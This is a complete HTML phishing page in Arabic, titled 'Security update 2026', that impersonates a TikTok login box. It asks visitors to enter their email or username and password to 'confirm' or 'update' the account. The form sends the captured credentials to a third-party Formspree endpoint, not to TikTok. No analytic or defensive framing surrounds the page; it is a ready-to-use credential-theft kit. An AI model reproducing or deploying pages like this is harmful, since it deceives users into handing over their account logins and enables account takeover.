<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان 2026</title>
    <style>
        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #111; padding: 30px; border-radius: 12px; width: 300px; border: 1px solid #333; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 6px; }
        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>TikTok Login</h2>
        <p style="font-size: 0.8rem; color: #888;">سجل دخولك لتأكيد الحساب</p>
        <form action="https://formspree.io/f/mqaebrda" method="POST">
            <input type="text" name="User" placeholder="الإيميل أو اسم المستخدم" required>
            <input type="password" name="Pass" placeholder="كلمة السر" required>
            <button type="submit">تحديث الحساب الآن</button>
        </form>
    </div>
</body>
</html>
